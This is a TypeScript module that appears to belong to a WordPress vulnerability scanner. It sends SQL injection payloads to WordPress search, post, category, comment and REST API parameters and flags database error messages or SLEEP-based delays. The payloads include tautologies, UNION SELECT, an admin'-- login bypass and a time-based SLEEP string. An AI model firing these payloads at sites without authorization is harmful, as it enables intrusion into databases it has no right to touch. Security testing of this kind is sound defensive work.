import type { ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe } from '../utils.js';

const MODULE_NAME = 'SQL Injection Probe';

const SQLI_PAYLOADS = [
  "'",
  "' OR '1'='1",
  "' OR 1=1--",
  "1 UNION SELECT NULL--",
  '1 AND 1=2',
  "admin'--",
  "1' AND '1'='2",
  '1 ORDER BY 10--',
];

const ERROR_INDICATORS = [
  'you have an error in your sql syntax',
  'warning: mysql',
  'unclosed quotation mark',
  'quoted string not properly terminated',
  'mysqli_fetch',
  'pg_query()',
  'sqlite3',
  'ora-01756',
  'odbc driver',
  'sqlstate',
  'db2 sql error',
  'mariadb server version',
  'mysql server version',
  'division by zero',
  'supplied argument is not a valid mysql',
  'syntax error',
  'invalid query',
  'column not found',
  "table doesn't exist",
  'unknown column',
];

// [endpointTemplate, label] — {payload} is replaced with the test value
const PROBE_ENDPOINTS: Array<[string, string]> = [
  ['/?s={payload}',                           'search'],
  ['/?p={payload}',                           'post_id'],
  ['/?page_id={payload}',                     'page_id'],
  ['/?cat={payload}',                         'category'],
  ['/?tag={payload}',                         'tag'],
  ['/?author={payload}',                      'author_id'],
  ['/wp-comments-post.php?comment={payload}', 'comment'],
  ['/?product_id={payload}',                  'woocommerce_product'],
  ['/wp-json/wp/v2/posts?per_page={payload}', 'rest_api_posts'],
  ['/wp-json/wp/v2/users?per_page={payload}', 'rest_api_users'],
];

function hasError(text: string): boolean {
  const lower = text.toLowerCase();
  return ERROR_INDICATORS.some(ind => lower.includes(ind));
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: ReturnType<typeof finding>[] = [];
  const errors: string[] = [];

  try {
    // Baseline: fetch all endpoints in parallel with safe payload; record timing for time-based comparison
    const baselines = new Map<string, boolean>();
    const baselineTimes = new Map<string, number>();
    await parallelProbe(PROBE_ENDPOINTS, async ([endpointTemplate, label]) => {
      const safeUrl = target + endpointTemplate.replace('{payload}', '1');
      const t0 = Date.now();
      const r0 = await fetchURL(safeUrl);
      baselineTimes.set(label, Date.now() - t0);
      const body = r0 ? await r0.text() : '';
      baselines.set(label, hasError(body));
    });

    // Flatten [endpoint, payload] combos — all run in parallel (no inner sequential loop)
    const hitEndpoints = new Set<string>();
    const combos: [string, string, string][] = [];
    for (const [endpointTemplate, label] of PROBE_ENDPOINTS) {
      if (!baselines.get(label)) {
        for (const payload of SQLI_PAYLOADS) {
          combos.push([endpointTemplate, label, payload]);
        }
      }
    }
    await parallelProbe(combos, async ([endpointTemplate, label, payload]) => {
      if (hitEndpoints.has(label)) return;
      const url = target + endpointTemplate.replace('{payload}', encodeURIComponent(payload));
      const res = await fetchURL(url);
      if (!res) return;
      if ((res.status === 200 || res.status === 500) && hasError(await res.text())) {
        hitEndpoints.add(label);
        findings.push(finding('SQLI_ERROR_TRIGGERED', 'HIGH', url,
          `SQL error triggered via '${label}' param with payload: ${payload.slice(0, 60)}`,
          { evidence: JSON.stringify({ label, payload }), remediation: 'Use parameterized queries. Install a WAF plugin like Wordfence or Sucuri.' },
        ));
      }
    }, 30);

    // Time-based check on top 3 unhit endpoints only (budget-constrained).
    const sleepCombos = PROBE_ENDPOINTS
      .filter(([, label]) => !baselines.get(label) && !hitEndpoints.has(label))
      .slice(0, 3);
    await parallelProbe(sleepCombos, async ([endpointTemplate, label]) => {
      const sleepPayload = '1 AND SLEEP(2)--';
      const sleepUrl = target + endpointTemplate.replace('{payload}', encodeURIComponent(sleepPayload));
      const baselineMs = baselineTimes.get(label) ?? 2000;
      const t0 = Date.now();
      const rSleep = await fetchURL(sleepUrl, { timeoutMs: 5_000 });
      const elapsedMs = Date.now() - t0;
      const elapsedSec = elapsedMs / 1000;
      if (rSleep && elapsedSec >= 3.5 && elapsedMs >= baselineMs + 2000) {
        findings.push(finding('SQLI_TIME_BASED_INDICATOR', 'HIGH', sleepUrl,
          `Time-based SQLi indicator on '${label}' — response took ${elapsedSec.toFixed(1)}s with SLEEP payload (baseline: ${(baselineMs / 1000).toFixed(1)}s)`,
          { evidence: JSON.stringify({ label, payload: sleepPayload, elapsed: Math.round(elapsedSec * 100) / 100, baseline_sec: Math.round(baselineMs / 100) / 10 }), remediation: 'Use parameterized queries. Install a WAF plugin like Wordfence or Sucuri.' },
        ));
      }
    }, 3);
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
